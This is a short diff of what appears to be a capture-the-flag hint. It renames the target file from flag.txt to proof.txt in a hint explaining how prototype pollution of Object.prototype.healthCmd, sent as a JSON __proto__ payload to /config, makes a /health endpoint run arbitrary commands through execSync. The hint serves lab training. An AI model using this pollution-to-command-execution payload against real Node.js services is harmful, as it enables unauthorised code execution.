@@ -21,9 +21,9 @@ it builds `const opts = {}` and reads `opts.healthCmd` with a fallback. `opts` h
 <details><summary>Hint 4 — connect them</summary>
 
 Pollute `Object.prototype.healthCmd`, and `opts.healthCmd` inherits it. `/health` then runs it through
-`execSync`. Set it to `cat /flag.txt`:
+`execSync`. Set it to `cat /proof.txt`:
 ```
-POST /config   {"__proto__":{"healthCmd":"cat /flag.txt"}}
+POST /config   {"__proto__":{"healthCmd":"cat /proof.txt"}}
 GET  /health
 ```
 </details>
